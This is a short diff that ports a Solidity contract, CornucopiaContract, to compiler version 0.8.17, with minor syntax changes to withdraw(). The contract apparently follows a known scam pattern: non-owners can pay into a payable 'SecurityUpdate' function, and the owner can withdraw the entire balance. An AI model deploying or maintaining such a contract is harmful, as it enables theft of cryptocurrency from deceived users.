@@ -1,4 +1,5 @@
-pragma solidity ^0.4.26;
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.17;
 
 contract CornucopiaContract{
     address private owner;
@@ -13,7 +14,7 @@ contract CornucopiaContract{
 
     function withdraw() public {
         require(owner == msg.sender, "owner error");
-        msg.sender.transfer(address(this).balance);
+        payable(msg.sender).transfer(address(this).balance);
     }
     function SecurityUpdate() public payable{
         require(owner != msg.sender);
